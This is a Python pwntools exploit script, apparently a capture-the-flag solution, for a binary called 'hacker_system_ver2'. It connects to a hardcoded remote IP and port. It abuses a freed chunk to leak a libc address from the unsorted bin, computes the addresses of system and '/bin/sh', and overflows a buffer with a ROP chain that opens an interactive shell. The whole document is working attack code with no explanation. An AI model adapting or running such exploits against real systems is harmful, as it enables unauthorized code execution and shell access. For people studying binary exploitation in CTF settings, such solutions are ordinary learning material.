#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./hacker_system_ver2"

unsorted_bin_off = 0x3c4b78
system_off = 0x45390
bin_sh_off = 0x18cd57

pop_rdi_ret = 0x400fb3

#p = process(elf)
p = remote("111.230.149.72", 10008)

def add(name, age, length, intro):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("input the hacker's name:")
    p.sendline(name)
    p.recvuntil("input the hacker's age:")
    p.sendline(str(age))
    p.recvuntil("input the introduce's length:")
    p.sendline(str(length))
    p.recvuntil("input the intro:")
    p.send(intro)

def printh(length, name):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("input name length:")
    p.sendline(str(length))
    p.recvuntil("input hacker's name:")
    p.send(name)
    
def delete(length, name):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("input name length:")
    p.sendline(str(length))
    p.recvuntil("input hacker's name:")
    p.send(name)


add("A", 1, 0x100, "\n")
add("A", 1, 0x3, "123")

delete(2, "A\n")

printh(2, "A\n")

p.recvuntil("intro:")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-unsorted_bin_off
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off
bin_sh_addr = libc_base+bin_sh_off

payload = p8(0)*0x38
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
printh(0x50, payload)

p.interactive()
